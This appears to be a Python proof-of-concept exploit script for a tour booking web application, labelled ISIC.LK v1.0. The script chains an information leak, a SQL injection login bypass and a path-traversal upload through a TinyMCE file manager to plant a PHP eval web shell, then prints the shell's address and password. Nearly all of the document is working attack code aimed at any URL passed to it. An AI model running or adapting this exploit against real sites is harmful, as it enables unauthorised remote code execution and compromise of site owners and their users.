# coding:utf-8
import requests
import sys
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()

'''
name：isic.lk tour booking website multi vuln lead to RCE
type：code exec
desc：isic.lk tour booking website multi vuln (sqli/ upload / info leak) lead to RCE
CVE: 
time: 2022/04/03
version: ISIC.LK v1.0
target: 
'''

url = sys.argv[1]
if url.endswith('/') : url = url[:-1]
# proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
proxies = {}
            
try:
    ws_code = """<?php eval($_POST[own]); ?>"""
    r = requests.Session()
    r.proxies = proxies
    req = r.get(url , timeout=15, verify=False, proxies=proxies)

    # 1.get username with info leak
    get_user_data = {'action':'view'}
    get_user_url = url + '/system/user/modules/mod_users/controller.php'
    req = r.post(get_user_url , data=get_user_data , timeout=15, verify=False, proxies=proxies)
    soup = BeautifulSoup(req.text, 'lxml')
    username = soup.find_all('td')[1].text

    # 2.bypass login and make our PHPSESSION work
    login_url = url + '/system/user/modules/mod_users/controller.php'
    login_data = {
        'action':'doLogin',
        'username':f"{username}' union select 1,2,3,4,5,6,'0192023a7bbd73250516f069df18b500',8,9 limit 1,1#",
        'password':'admin123',
    }
    req = r.post(login_url , data=login_data , timeout=15, verify=False, proxies=proxies)
    req = r.get(url + '/admin', timeout=15, verify=False, proxies=proxies)
    req = r.get(url + '/system/application/libs/js/tinymce/plugins/filemanager/dialog.php?type=0&editor=mce_0&field_id=selected_file', timeout=15, verify=False, proxies=proxies)
    
    # 3.upload 
    upload_url = url + '/system/application/libs/js/tinymce/plugins/filemanager/upload.php'
    upload_payload = {	
        'path':(None,'../../../../../../../images/'),
        'path_thumb':(None,'thumbs/'),
        'file':('test.php',ws_code,'image/jpeg'),
    }
    req = r.post(upload_url , files=upload_payload , timeout=15, verify=False, proxies=proxies)
    if req.status_code == 200 and len(req.text) == 0:
        print(f'\nupload success, webshell url : {url}/images/test.php\n\npassword:own\n\nyou could connect this shell with AntSword.')

except Exception as e:
    print(str(e))
